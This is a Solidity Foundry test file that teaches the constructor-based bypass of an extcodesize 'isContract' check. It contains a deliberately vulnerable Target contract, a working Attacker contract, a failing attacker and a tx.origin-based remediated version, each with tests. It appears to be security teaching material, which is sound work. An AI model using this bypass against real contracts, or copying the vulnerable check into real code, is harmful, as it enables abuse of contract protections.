// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";


// Bypass isContract:
// The attacker only needs to write the code in the constructor of the smart contract to bypass the detection mechanism of whether it is a smart contract.

contract BypassIsContract is Test {

  function testSuccessAttack() public {
    Target target = new Target();
    Attacker attacker = new Attacker(address(target));
    assertEq(address(attacker), attacker.addr());
    assertEq(attacker.isContract(), false);
    assertEq(target.flag(), true);
  }

  function testFailedAttack() public {
    Target target = new Target();
    FailedAttacker attacker = new FailedAttacker();
    vm.expectRevert();
    attacker.attack(address(target));
  }

  function testRemediatedTarget() public {
    RemediatedTarget target = new RemediatedTarget();
    vm.expectRevert();
    Attacker attacker = new Attacker(address(target));
  }
}


contract Target {
  bool public flag = false;

  function isContract() public view returns (bool) {
    address msgSender = msg.sender;
    uint256 size;
    assembly {
      size := extcodesize(msgSender)
    }
    return size > 0;
  }

  function protected() external {
    require(!isContract(), "contract not allowed");
    flag = true;
  }
}

contract RemediatedTarget {
  bool public flag = false;

  function isContract() public view returns (bool) {
    return msg.sender != tx.origin;
  }

  function protected() external {
    require(!isContract(), "contract not allowed");
    flag = true;
  }
}

contract Attacker {

  address public addr;
  bool public isContract;

  constructor(address target) {
    addr = address(this);
    isContract = Target(target).isContract();
    Target(target).protected();
  }
}

contract FailedAttacker {
  address public addr;
  bool public isContract;

  function attack(address target) external {
//    addr = address(this);
//    isContract = Target(target).isContract();
    Target(target).protected();
  }
}

